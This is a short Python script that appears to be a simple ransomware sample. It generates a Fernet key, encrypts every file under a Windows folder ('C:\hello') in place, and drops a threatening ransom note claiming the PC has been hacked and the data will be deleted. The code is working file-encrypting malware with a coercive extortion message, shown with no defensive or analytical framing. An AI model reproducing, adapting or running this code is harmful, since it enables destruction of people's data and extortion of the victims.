from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def cargar_key():
    return open("key.key", "rb").read()

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, "wb") as file:
            file.write(encrypted_data)

if __name__ == "__main__":

    user = os.environ.get('USERNAME')
    print("Username is: " + user)

    path_to_encrypt = "C:\\hello"
    items = os.walk(path_to_encrypt)

    # full_path = [path_to_encrypt+"\\"+item for item in items]
    full_path = [os.path.join(root, name)
                 for root, dirs, files in os.walk(path_to_encrypt)
                 for name in files]
    print(full_path)
    generar_key()
    key = cargar_key()

    encrypt(full_path, key)

    with open(path_to_encrypt+"\\"+"readme.txt", "w") as file:
        file.write("hi your PC has been hacked\n")
        file.write(".\n")
        file.write(".\n")
        file.write(".\n")
        file.write("WHAT HAPPENED TO MY COMPUTER?\n")
        file.write("Your important data has been encrypted, photos, videos, documents, they are encrypted, you don´t have to much time\n")
        file.write(".\n")
        file.write(".\n")
        file.write("WHAT CAN I DO?\n")
        file.write("I´m not telling to much but if you don´t think well, everything will be deleted and you´ll stay like now\n")
        file.write(".\n")
        file.write(".\n")
        file.write(".\n")
        file.write("the safety of your computer it´s in your hands, you can safe your computer or let it DIE\n")
        file.write("you can´t do anything")
